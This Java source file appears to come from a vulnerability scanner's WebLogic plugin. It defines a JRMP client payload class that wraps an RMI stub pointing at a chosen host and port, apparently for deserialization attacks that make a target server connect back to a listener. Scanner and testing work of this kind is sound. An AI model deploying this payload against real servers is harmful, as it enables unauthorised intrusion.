package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.Host;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.server.ObjID;
import java.util.Random;

public class GBWJRMPClient4 implements GBWNoEchoPayload<RMIConnectionImpl_Stub> {

    public RMIConnectionImpl_Stub getObject (Host host) {

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host.getIp(), host.getPort());
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RMIConnectionImpl_Stub obj = new RMIConnectionImpl_Stub(ref);
        return obj;
    }

    @Override
    public String getName() {
        return "GBWJRMPClient4";
    }

}
